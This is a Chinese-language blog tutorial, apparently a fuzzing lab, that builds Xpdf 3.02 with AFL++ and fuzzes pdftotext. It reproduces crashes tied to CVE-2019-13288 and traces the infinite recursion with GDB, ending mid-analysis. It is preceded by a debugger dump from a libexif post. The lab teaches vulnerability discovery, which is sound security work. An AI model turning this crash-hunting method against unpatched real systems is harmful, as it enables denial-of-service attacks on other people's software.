<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line">*RAX  <span class="number">0x4502a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">*RBX  <span class="number">0x453</span></span><br><span class="line">*RCX  <span class="number">0x453120</span> ◂— <span class="number">0x0</span></span><br><span class="line">*RDX  <span class="number">0x1</span></span><br><span class="line">*RDI  <span class="number">0x452c46</span> ◂— <span class="number">0xffffffff2a004d4d</span> <span class="comment">/* &#x27;MM&#x27; */</span></span><br><span class="line">*RSI  <span class="number">0x20c394</span> ◂— <span class="number">0x6873616c46004d4d</span> <span class="comment">/* &#x27;MM&#x27; */</span></span><br><span class="line">*R15  <span class="number">0x452c40</span> ◂— <span class="number">0x4d4d000066697845</span> <span class="comment">/* &#x27;Exif&#x27; */</span></span><br><span class="line">*RBP  <span class="number">0x452b90</span> ◂— <span class="number">0x8</span></span><br><span class="line">*RSP  <span class="number">0x7fffffffc5d0</span> ◂— <span class="number">0x5b0000006e</span> <span class="comment">/* &#x27;n&#x27; */</span></span><br><span class="line">*RIP  <span class="number">0x22bb8a</span> (exif_data_load_data+<span class="number">1178</span>) ◂— mov    ebp, dword ptr [r15 + <span class="number">0xa</span>]</span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line"> ► <span class="number">0x22bb8a</span> &lt;exif_data_load_data+<span class="number">1178</span>&gt;    mov    ebp, dword ptr [r15 + <span class="number">0xa</span>]</span><br><span class="line">   <span class="number">0x22bb8e</span> &lt;exif_data_load_data+<span class="number">1182</span>&gt;    bswap  ebp</span><br><span class="line">───────────────────────────────[ SOURCE (CODE) ]────────────────────────────────</span><br><span class="line">In file: /home/yhellow/libexif<span class="number">-0.6</span><span class="number">.14</span>/libexif/exif-utils.c</span><br><span class="line">   <span class="number">130</span> exif_get_slong (<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *b, ExifByteOrder order)</span><br><span class="line">   <span class="number">131</span> &#123;</span><br><span class="line">   <span class="number">132</span> 	<span class="keyword">if</span> (!b) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   <span class="number">133</span>         <span class="keyword">switch</span> (order) &#123;</span><br><span class="line">   <span class="number">134</span>         <span class="keyword">case</span> EXIF_BYTE_ORDER_MOTOROLA:</span><br><span class="line"> ► <span class="number">135</span>                 <span class="keyword">return</span> ((b[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) | (b[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | (b[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | b[<span class="number">3</span>]);</span><br><span class="line">   <span class="number">136</span>         <span class="keyword">case</span> EXIF_BYTE_ORDER_INTEL:</span><br><span class="line">   <span class="number">137</span>                 <span class="keyword">return</span> ((b[<span class="number">3</span>] &lt;&lt; <span class="number">24</span>) | (b[<span class="number">2</span>] &lt;&lt; <span class="number">16</span>) | (b[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) | b[<span class="number">0</span>]);</span><br><span class="line">   <span class="number">138</span>         &#125;</span><br><span class="line">   <span class="number">139</span> </span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; telescope <span class="number">0x452c40</span>+<span class="number">0xa</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x452c4a</span> ◂— <span class="number">0xffffffffffffffff</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x452c62</span> ◂— <span class="number">0xffffffffff</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x452c6a</span> ◂— <span class="number">0x2000f010c0008</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x452c72</span> ◂— <span class="number">0x19e000000090000</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x452c7a</span> ◂— <span class="number">0x10000000020010</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x452c82</span> ◂— <span class="number">0x3001201a80000</span></span><br></pre></td></tr></table></figure>
<ul>
<li>应该是程序的逻辑出错了，<code>0x452c40</code> 这里应该是一个结构体</li>
<li>感觉离漏洞点已经很接近了，但就是说不出来具体哪里有问题</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/14/Fuzz%20Lab1-Xpdf/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/14/Fuzz%20Lab1-Xpdf/" class="post-title-link" itemprop="url">Fuzz Lab1-Xpdf</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-08-14 12:06:01 / Modified: 13:25:01" itemprop="dateCreated datePublished" datetime="2022-08-14T12:06:01+08:00">2022-08-14</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>7.6k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>7 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Fuzz-Lab1：Xpdf"><a href="#Fuzz-Lab1：Xpdf" class="headerlink" title="Fuzz-Lab1：Xpdf"></a>Fuzz-Lab1：Xpdf</h2><p>本次实验我们将对 <strong>Xpdf</strong>（一款 PDF 转换解析工具）进行 fuzz，目标是在 <a target="_blank" rel="noopener" href="https://www.cvedetails.com/cve/CVE-2019-13288/"><strong>CVE-2019-13288</strong></a> 中发现一个 crash/PoC </p>
<ul>
<li>CVE-2019-13288 是一个漏洞，可能会通过精心制作的 payload 文件导致无限递归</li>
<li>由于程序中每个被调用的函数都会在栈上分配一个栈帧，如果一个函数被递归调用这么多次，就会导致栈内存耗尽和程序崩溃</li>
<li>因此，远程攻击者可以利用它进行 DoS 攻击</li>
</ul>
<p>学习的目标：</p>
<ul>
<li>使用 instrumentation 工具编译目标应用程序</li>
<li>运行模糊器（afl-fuzz）</li>
<li>使用调试器（GDB）对崩溃进行分类</li>
</ul>
<h2 id="Download-and-build-your-target"><a href="#Download-and-build-your-target" class="headerlink" title="Download and build your target"></a>Download and build your target</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME # 创建目录</span><br><span class="line">mkdir fuzzing_xpdf &amp;&amp; cd fuzzing_xpdf/</span><br><span class="line">sudo apt install build-essential</span><br><span class="line"></span><br><span class="line">cd ..</span><br><span class="line">wget https://dl.xpdfreader.com/old/xpdf-3.02.tar.gz # 获取xpdf</span><br><span class="line">tar -xvzf xpdf-3.02.tar.gz</span><br><span class="line"></span><br><span class="line">cd xpdf-3.02 # 编译&amp;安装xpdf</span><br><span class="line">sudo apt update &amp;&amp; sudo apt install -y build-essential gcc</span><br><span class="line">./configure --prefix=&quot;$HOME/fuzzing_xpdf/install/&quot;</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">cd $HOME/fuzzing_xpdf # 下载一些PDF示例</span><br><span class="line">mkdir pdf_examples &amp;&amp; cd pdf_examples</span><br><span class="line">wget https://github.com/mozilla/pdf.js-sample-files/raw/master/helloworld.pdf</span><br><span class="line">wget http://www.africau.edu/images/default/sample.pdf</span><br><span class="line">wget https://www.melbpc.org.au/wp-content/uploads/2017/10/small-example-pdf-file.pdf</span><br></pre></td></tr></table></figure>
<ul>
<li>我们可以使用以下命令测试 pdfinfo 二进制文件：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">➜  pdf_examples $HOME/fuzzing_xpdf/install/bin/pdfinfo -box -meta $HOME/fuzzing_xpdf/pdf_examples/helloworld.pdf</span><br><span class="line">Tagged:         no</span><br><span class="line">Pages:          1</span><br><span class="line">Encrypted:      no</span><br><span class="line">Page size:      200 x 200 pts</span><br><span class="line">MediaBox:           0.00     0.00   200.00   200.00</span><br><span class="line">CropBox:            0.00     0.00   200.00   200.00</span><br><span class="line">BleedBox:           0.00     0.00   200.00   200.00</span><br><span class="line">TrimBox:            0.00     0.00   200.00   200.00</span><br><span class="line">ArtBox:             0.00     0.00   200.00   200.00</span><br><span class="line">File size:      678 bytes</span><br><span class="line">Optimized:      no</span><br><span class="line">PDF version:    1.7</span><br></pre></td></tr></table></figure>
<h2 id="Install-AFL"><a href="#Install-AFL" class="headerlink" title="Install AFL++"></a>Install AFL++</h2><p>在本课程中，我们将使用最新版本的 <a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus">AFL++ fuzzer</a> ，您可以通过两种方式安装所有内容：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update # 安装依赖</span><br><span class="line">sudo apt-get install -y build-essential python3-dev automake git flex bison libglib2.0-dev libpixman-1-dev python3-setuptools</span><br><span class="line">sudo apt-get install -y lld-11 llvm-11 llvm-11-dev clang-11 || sudo apt-get install -y lld llvm llvm-dev clang </span><br><span class="line">sudo apt-get install -y gcc-$(gcc --version|head -n1|sed &#x27;s/.* //&#x27;|sed &#x27;s/\..*//&#x27;)-plugin-dev libstdc++-$(gcc --version|head -n1|sed &#x27;s/.* //&#x27;|sed &#x27;s/\..*//&#x27;)-dev</span><br><span class="line"></span><br><span class="line">cd $HOME # 安装AFL++</span><br><span class="line">git clone https://github.com/AFLplusplus/AFLplusplus &amp;&amp; cd AFLplusplus</span><br><span class="line">export LLVM_CONFIG=&quot;llvm-config-11&quot;</span><br><span class="line">make distrib</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
<p>AFL 是一个 <strong>coverage-guided fuzzer</strong>，这意味着它为每个变异的输入收集覆盖信息，以发现新的执行路径和潜在的错误</p>
<ul>
<li>当源代码可用时，AFL 可以使用插桩，在每个基本块（函数、循环等）的开头插入函数调用</li>
<li>要想我们的目标应用程序启用检测，我们需要使用 AFL 的编译器编译代码</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rm -r $HOME/fuzzing_xpdf/install # 清理所有之前编译的目标文件和可执行文件</span><br><span class="line">cd $HOME/fuzzing_xpdf/xpdf-3.02/</span><br><span class="line">make clean</span><br><span class="line"></span><br><span class="line">export LLVM_CONFIG=&quot;llvm-config-11&quot; # 现在我们将使用afl-clang-fast编译器构建xpdf</span><br><span class="line">CC=$HOME/AFLplusplus/afl-clang-fast CXX=$HOME/AFLplusplus/afl-clang-fast++ ./configure --prefix=&quot;$HOME/fuzzing_xpdf/install/&quot;</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<ul>
<li>在 AFL 编译文件时候 afl-gcc 会在规定位置插入桩代码，可以理解为一个个的探针（但是没有暂停功能），在后续 fuzz 的过程中会根据这些桩代码进行路径探索，测试等</li>
<li>AFL 通过插桩的形式注入到被编译的程序中，实现对分支（branch、edge）覆盖率的捕获，以及分支节点计数</li>
</ul>
<p>我们可以使用以下命令测试 pdfinfo 二进制文件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i $HOME/fuzzing_xpdf/pdf_examples/ -o $HOME/fuzzing_xpdf/out/ -s 123 -- $HOME/fuzzing_xpdf/install/bin/pdftotext @@ $HOME/fuzzing_xpdf/output</span><br></pre></td></tr></table></figure>
<ul>
<li><em>-i</em> ：表示我们必须放置输入案例的目录（a.k.a 文件示例）</li>
</ul>
<ul>
<li><em>-o</em> ：表示 AFL++ 将存储变异文件的目录</li>
<li><em>-s</em> ：表示要使用的静态随机种子</li>
<li><em>@@</em> ：是占位符目标的命令行，AFL 将用每个输入文件名替换</li>
</ul>
<img src="/2022/08/14/Fuzz%20Lab1-Xpdf/1660312674524.png" class width="1660312674524">  
<ul>
<li>红色的 uniq. crash 值，显示发现的唯一崩溃数</li>
<li>您可以在 <code>$HOME/fuzzing_xpdf/out/</code> 目录中找到这些崩溃文件</li>
<li>一旦发现第一次崩溃，您就可以停止模糊器，这是我们将要处理的问题（根据您的机器性能，最多可能需要一到两个小时才能发生崩溃）</li>
</ul>
<h2 id="Do-it-yourself"><a href="#Do-it-yourself" class="headerlink" title="Do it yourself!"></a>Do it yourself!</h2><p>为了完成这个练习，你需要：</p>
<ul>
<li>用指定的文件重现崩溃</li>
<li>调试 crash 发现问题</li>
<li>修复问题</li>
</ul>
<p>PS：预计时间 = 120 分钟</p>
<p>通过上一个部分我们已经获取了两个 crash，在 <code>$HOME/fuzzing_xpdf/out/default/crashes</code> 中可以找到：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  crashes ls</span><br><span class="line">id:<span class="number">000000</span>,sig:<span class="number">11</span>,src:<span class="number">000000</span>+<span class="number">000810</span>,time:<span class="number">45712</span>,execs:<span class="number">44457</span>,op:splice,rep:<span class="number">16</span></span><br><span class="line">id:<span class="number">000001</span>,sig:<span class="number">11</span>,src:<span class="number">000726</span>,time:<span class="number">62396</span>,execs:<span class="number">61755</span>,op:havoc,rep:<span class="number">2</span></span><br><span class="line">README.txt</span><br></pre></td></tr></table></figure>
<p>在使用 crash 文件进行调试前，我们需要先了解一下 Xpdf</p>
<h2 id="Xpdf"><a href="#Xpdf" class="headerlink" title="Xpdf"></a>Xpdf</h2><p>Xpdf 是可移植文档格式 (PDF) 文件的开源查看器（这些有时也被称为“Acrobat”文件，来自 Adobe 的 PDF 软件的名称）</p>
<ul>
<li>Xpdf 项目还包括 PDF 文本提取器、PDF 到 PostScript 转换器和各种其他实用程序</li>
<li>Xpdf 在 UNIX、VMS 和 OS/2 上的 X 窗口系统下运行，非 X 组件（pdftops、pdftotext 等）也可以在 Win32 系统上运行，并且应该可以在几乎任何具有像样 C++ 编译器的系统上运行</li>
<li>Xpdf 被设计为小巧高效，它可以使用 Type 1 或 TrueType 字体</li>
</ul>
<p>要运行 Xpdf，只需键入：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xpdf file.pdf</span><br></pre></td></tr></table></figure>
<p>要生成 PostScript 文件，请点击 xpdf 中的“打印”按钮，或运行 pdftops：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pdftops file.pdf</span><br></pre></td></tr></table></figure>
<p>要生成纯文本文件，请运行 pdftotext：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pdftotext file.pdf</span><br></pre></td></tr></table></figure>
<p>一共有5个实用程序（在他们的手册页中有完整的描述）：</p>
<ul>
<li>pdftotext — 通过 PDF 文件生成纯文本文件</li>
<li>pdfinfo — 转储 PDF 文件的信息字典（加上其他一些有用的信息）</li>
<li>pdffonts — 列出 PDF 文件中使用的字体以及各种每种字体的信息</li>
<li>pdftops — 将 PDF 文件转换为一系列 PPM/PGM/PBM 格式位图</li>
<li>pdfimages — 从 PDF 文件中提取图像</li>
</ul>
<h2 id="Reproduce-the-crash"><a href="#Reproduce-the-crash" class="headerlink" title="Reproduce the crash"></a>Reproduce the crash</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp id:000000,sig:11,src:000000+000810,time:45712,execs:44457,op:splice,rep:16 /home/yhellow/fuzzing_xpdf/install/bin </span><br><span class="line">cd /home/yhellow/fuzzing_xpdf/install/bin</span><br><span class="line">mv id:000000,sig:11,src:000000+000810,time:45712,execs:44457,op:splice,rep:16 test.pdf</span><br></pre></td></tr></table></figure>
<p>依次使用 <code>pdftotext</code> <code>pdfinfo</code> <code>pdffonts</code> <code>pdftops</code> <code>pdfimages</code> 运行测试文件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  bin ./pdftotext test.pdf </span><br><span class="line">Error: <span class="function">May <span class="keyword">not</span> be a PDF <span class="title">file</span> <span class="params">(continuing anyway)</span></span></span><br><span class="line"><span class="function">Error: PDF file is damaged - attempting to reconstruct xref table...</span></span><br><span class="line"><span class="function">[1]    3065 segmentation fault  ./pdftotext test.pdf <span class="comment">/* 段错误 */</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">➜  bin ./pdfinfo test.pdf          </span><br><span class="line">Error: <span class="function">May <span class="keyword">not</span> be a PDF <span class="title">file</span> <span class="params">(continuing anyway)</span></span></span><br><span class="line"><span class="function">Error: PDF file is damaged - attempting to reconstruct xref table...</span></span><br><span class="line"><span class="function">Subject:        </span></span><br><span class="line"><span class="function">Keywords:       </span></span><br><span class="line"><span class="function">Author:         Administrator</span></span><br><span class="line"><span class="function">Creator:        PDFCreator 2.0.2.0</span></span><br><span class="line"><span class="function">Producer:       Pator 2.0.2.0</span></span><br><span class="line"><span class="function">CreationDate:   Sun Jul 26 00:25:22 2015</span></span><br><span class="line"><span class="function">ModDate:        Sun Jul 26 00:25:22 2015</span></span><br><span class="line"><span class="function">Tagged:         no</span></span><br><span class="line"><span class="function">Pages:          1</span></span><br><span class="line"><span class="function">Encrypted:      no</span></span><br><span class="line"><span class="function">Page size:      595 x 842 <span class="title">pts</span> <span class="params">(A4)</span></span></span><br><span class="line"><span class="function">File size:      4109 bytes</span></span><br><span class="line"><span class="function">Optimized:      no</span></span><br><span class="line"><span class="function">PDF version:    0.0</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  bin ./pdffonts test.pdf </span><br><span class="line">Error: <span class="function">May <span class="keyword">not</span> be a PDF <span class="title">file</span> <span class="params">(continuing anyway)</span></span></span><br><span class="line"><span class="function">Error: PDF file is damaged - attempting to reconstruct xref table...</span></span><br><span class="line"><span class="function">name                                 type              emb sub uni object ID</span></span><br><span class="line"><span class="function">------------------------------------ ----------------- --- --- --- ---------</span></span><br><span class="line"><span class="function">Times-Roman </span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  bin ./pdftops test.pdf        </span><br><span class="line">Error: <span class="function">May <span class="keyword">not</span> be a PDF <span class="title">file</span> <span class="params">(continuing anyway)</span></span></span><br><span class="line"><span class="function">Error: PDF file is damaged - attempting to reconstruct xref table...</span></span><br><span class="line"><span class="function">[1]    3141 segmentation fault  ./pdftops test.pdf <span class="comment">/* 段错误 */</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  bin ./pdfimages test.pdf test     </span><br><span class="line">Error: <span class="function">May <span class="keyword">not</span> be a PDF <span class="title">file</span> <span class="params">(continuing anyway)</span></span></span><br><span class="line"><span class="function">Error: PDF file is damaged - attempting to reconstruct xref table...</span></span><br><span class="line"><span class="function">[1]    3236 segmentation fault  ./pdfimages test.pdf test <span class="comment">/* 段错误 */</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>其中 <code>pdftotext</code> <code>pdftops</code> <code>pdfimages</code> 出现了段错误</li>
<li>我们先用 GDB 调试 <code>pdftotext</code>：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb --args ./pdftotext ./test.pdf</span><br></pre></td></tr></table></figure>
<ul>
<li>使用 GDB <code>bt</code> 命令来获取栈回溯：</li>
</ul>
<img src="/2022/08/14/Fuzz%20Lab1-Xpdf/1660445660783.png" class width="1660445660783"> 
<ul>
<li>发现程序的行为异常，不断调用 <code>Object::dictLookup</code> <code>Parser::makeStream</code> <code>Parser::getObj</code> <code>XRef::fetch</code>，程序无限递归最终崩溃（经过测试，<code>pdftops</code> <code>pdfimages</code> 中的段错误也是这个原因）</li>
</ul>
<p>我们在 <code>Object::dictLookup</code> <code>Parser::makeStream</code> <code>Parser::getObj</code> <code>XRef::fetch</code> 处打上断点，配合源码用 GDB 单步调试：</p>
<ul>
<li>触发断点的顺序如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Parser::getObj(若干次) -&gt; Parser::makeStream -&gt; Object::dictLookup -&gt; XRef::fetch</span><br></pre></td></tr></table></figure>
<ul>
<li>分析 <code>Parser::makeStream -&gt; Object::dictLookup</code>：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dict-&gt;dictLookup(<span class="string">&quot;Length&quot;</span>, &amp;obj); <span class="comment">/* 正常调用dictLookup */</span></span><br><span class="line"><span class="keyword">if</span> (obj.isInt()) &#123;</span><br><span class="line">  length = (Guint)obj.getInt();</span><br><span class="line">  obj.<span class="built_in">free</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  error(getPos(), <span class="string">&quot;Bad &#x27;Length&#x27; attribute in stream&quot;</span>);</span><br><span class="line">  obj.<span class="built_in">free</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>分析 <code>Object::dictLookup -&gt; XRef::fetch</code>：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> Object *<span class="title">Object::dictLookup</span><span class="params">(<span class="keyword">char</span> *key, Object *obj)</span></span></span><br><span class="line"><span class="function">  </span>&#123; <span class="keyword">return</span> dict-&gt;lookup(key, obj); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Object *<span class="title">Dict::lookup</span><span class="params">(<span class="keyword">char</span> *key, Object *obj)</span> </span>&#123;</span><br><span class="line">  DictEntry *e;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (e = find(key)) ? e-&gt;val.fetch(xref, obj) : obj-&gt;initNull(); <span class="comment">/* 正常调用fetch */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>分析 <code>XRef::fetch -&gt; Parser::getObj</code>：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">   parser-&gt;getObj(&amp;obj1); <span class="comment">/* 会调用4次getObj */</span></span><br><span class="line">   parser-&gt;getObj(&amp;obj2);</span><br><span class="line">   parser-&gt;getObj(&amp;obj3);</span><br><span class="line">   <span class="keyword">if</span> (!obj1.isInt() || obj1.getInt() != num ||</span><br><span class="line">!obj2.isInt() || obj2.getInt() != gen ||</span><br><span class="line">!obj3.isCmd(<span class="string">&quot;obj&quot;</span>)) &#123;</span><br><span class="line">     obj1.<span class="built_in">free</span>();</span><br><span class="line">     obj2.<span class="built_in">free</span>();</span><br><span class="line">     obj3.<span class="built_in">free</span>();</span><br><span class="line">     <span class="keyword">delete</span> parser;</span><br><span class="line">     <span class="keyword">goto</span> err;</span><br><span class="line">   &#125;</span><br><span class="line">   parser-&gt;getObj(obj, encrypted ? fileKey : (Guchar *)<span class="literal">NULL</span>,</span><br><span class="line">	   encAlgorithm, keyLength, num, gen);</span><br><span class="line">   obj1.<span class="built_in">free</span>();</span><br><span class="line">   obj2.<span class="built_in">free</span>();</span><br><span class="line">   obj3.<span class="built_in">free</span>();</span><br></pre></td></tr></table></figure>
<ul>
<li>分析 <code>Parser::getObj -&gt; Parser::getObj</code>：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">while</span> (!buf1.isCmd(<span class="string">&quot;&gt;&gt;&quot;</span>) &amp;&amp; !buf1.isEOF()) &#123;</span><br><span class="line">     <span class="keyword">if</span> (!buf1.isName()) &#123;</span><br><span class="line">error(getPos(), <span class="string">&quot;Dictionary key must be a name object&quot;</span>);</span><br><span class="line">shift();</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">key = copyString(buf1.getName());</span><br><span class="line">shift();</span><br><span class="line"><span class="keyword">if</span> (buf1.isEOF() || buf1.isError()) &#123;</span><br><span class="line">  gfree(key);</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">obj-&gt;dictAdd(key, getObj(&amp;obj2, fileKey, encAlgorithm, keyLength,</span><br><span class="line">			 objNum, objGen)); <span class="comment">/* 多次调用dictAdd,在其中调用getObj */</span></span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>分析 <code>Parser::getObj -&gt; Parser::makeStream</code>：</li>
